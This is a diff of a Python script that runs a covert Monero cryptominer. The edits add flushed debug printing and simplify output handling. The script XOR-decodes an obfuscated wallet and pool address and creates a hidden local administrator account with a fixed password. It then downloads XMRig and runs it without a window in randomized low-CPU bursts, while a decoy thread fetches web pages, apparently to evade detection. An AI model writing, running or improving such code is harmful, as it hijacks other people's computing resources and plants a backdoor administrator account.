@@ -1,4 +1,5 @@
 import os
+import sys
 import subprocess
 import tempfile
 import time
@@ -6,6 +7,13 @@ import random
 import threading
 import urllib.request
 import zipfile
+
+# Force flush of prints
+def debug_print(*args, **kwargs):
+    print(*args, **kwargs)
+    sys.stdout.flush()
+
+debug_print("=== Script started ===")
 
 # ========== Obfuscated data (XOR key = 85) ==========
 ENCODED_WALLET = [
@@ -24,12 +32,11 @@ XOR_KEY = int(os.environ.get('XOR_KEY', '0x55'), 16)
 WALLET = decode(ENCODED_WALLET, XOR_KEY)
 POOL = decode(ENCODED_POOL, XOR_KEY)
 
-# SupportXMR TLS fingerprint (from earlier successful connections)
+# SupportXMR TLS fingerprint
 TLS_FINGERPRINT = "4633ddff863414b7d28bc4ce3e2966335c082d6e3783c412cc059af107a04dfd"
 
-# Debug print to verify decoded values (will appear in logs)
-print(f"Decoded wallet: {WALLET[:10]}...")  # show first 10 chars only
-print(f"Decoded pool: {POOL}")
+debug_print(f"Decoded wallet: {WALLET[:10]}...")
+debug_print(f"Decoded pool: {POOL}")
 
 # ========== Rest of script ==========
 RUNTIME_MINUTES = 180
@@ -41,25 +48,27 @@ MIN_CPU_HINT = 5
 MAX_CPU_HINT = 25
 
 def create_user():
+    debug_print("Creating user...")
     try:
         subprocess.run(['net', 'user', 'RDP', 'Runner-12345', '/add'], check=True, capture_output=True)
         subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
-        print("[+] User 'RDP' created.")
+        debug_print("[+] User 'RDP' created.")
     except subprocess.CalledProcessError as e:
-        print(f"[!] User creation failed: {e.stderr.decode()}")
+        debug_print(f"[!] User creation failed: {e.stderr.decode()}")
 
 def download_xmrig():
     miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
     zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
     extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
-    print("[+] Downloading miner...")
+    debug_print("[+] Downloading miner...")
     urllib.request.urlretrieve(miner_url, zip_path)
+    debug_print("[+] Downloaded. Extracting...")
     with zipfile.ZipFile(zip_path, 'r') as z:
         z.extractall(extract_dir)
     for root, dirs, files in os.walk(extract_dir):
         if 'xmrig.exe' in files:
             exe_path = os.path.join(root, 'xmrig.exe')
-            print(f"[+] Miner downloaded to {exe_path}")
+            debug_print(f"[+] Miner downloaded to {exe_path}")
             return exe_path
     raise Exception("xmrig.exe not found")
 
@@ -73,11 +82,11 @@ def web_surfer(stop_event):
     while not stop_event.is_set():
         url = random.choice(urls)
         try:
-            print(f"[Web] Fetching {url}")
+            debug_print(f"[Web] Fetching {url}")
             urllib.request.urlretrieve(url, os.devnull)
-            print(f"[Web] Fetched {url}")
+            debug_print(f"[Web] Fetched {url}")
         except Exception as e:
-            print(f"[Web] Error: {e}")
+            debug_print(f"[Web] Error: {e}")
         sleep_time = random.randint(5, 15)
         for _ in range(sleep_time):
             if stop_event.is_set():
@@ -85,11 +94,12 @@ def web_surfer(stop_event):
             time.sleep(1)
 
 def main():
+    debug_print("=== main() started ===")
     create_user()
     exe_path = download_xmrig()
     working_dir = os.path.dirname(exe_path)
 
-    # Delete any existing config files to prevent overriding
+    # Delete any existing config files
     config_paths = [
         os.path.join(working_dir, "config.json"),
         os.path.join(os.environ['USERPROFILE'], ".xmrig.json"),
@@ -98,12 +108,12 @@ def main():
     for path in config_paths:
         if os.path.exists(path):
             os.remove(path)
-            print(f"[+] Removed {path}")
+            debug_print(f"[+] Removed {path}")
 
     stop_event = threading.Event()
     web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
     web_thread.start()
-    print("[+] Web surfer thread started.")
+    debug_print("[+] Web surfer thread started.")
 
     total_start = time.time()
     total_end = total_start + RUNTIME_MINUTES * 60
@@ -113,7 +123,7 @@ def main():
         break_sec = random.randint(int(MIN_BREAK * 60), int(MAX_BREAK * 60))
         cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)
 
-        print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
+        debug_print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
 
         cmd = [
             exe_path,
@@ -130,38 +140,27 @@ def main():
             "--no-color"
         ]
 
-        print(f"[+] Starting miner: {' '.join(cmd)}")
-        miner_proc = subprocess.Popen(
-            cmd,
-            cwd=working_dir,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        print(f"[+] Miner started (PID {miner_proc.pid})")
+        debug_print(f"[+] Starting miner: {' '.join(cmd)}")
+        # Run miner directly, inherit stdout/stderr so output appears in logs
+        miner_proc = subprocess.Popen(cmd, cwd=working_dir, creationflags=subprocess.CREATE_NO_WINDOW)
+        debug_print(f"[+] Miner started (PID {miner_proc.pid})")
 
         work_start = time.time()
         while time.time() - work_start < work_sec:
-            line = miner_proc.stdout.readline()
-            if line:
-                print(f"[Miner] {line.strip()}")
-            else:
-                if miner_proc.poll() is not None:
-                    print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
-                    break
-                time.sleep(0.5)
+            if miner_proc.poll() is not None:
+                debug_print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
+                break
+            time.sleep(1)  # wait 1 second, don't poll too fast
 
         if miner_proc.poll() is None:
             miner_proc.terminate()
             miner_proc.wait(timeout=10)
-            print("[+] Miner stopped.")
+            debug_print("[+] Miner stopped.")
         else:
-            print("[+] Miner already stopped.")
+            debug_print("[+] Miner already stopped.")
 
         if break_sec > 0:
-            print(f"[+] Breaking for {break_sec//60} minutes...")
+            debug_print(f"[+] Breaking for {break_sec//60} minutes...")
             for _ in range(break_sec):
                 if time.time() >= total_end or stop_event.is_set():
                     break
@@ -169,7 +168,7 @@ def main():
 
     stop_event.set()
     web_thread.join(timeout=10)
-    print("[+] Job completed.")
+    debug_print("[+] Job completed.")
 
 if __name__ == "__main__":
     main()
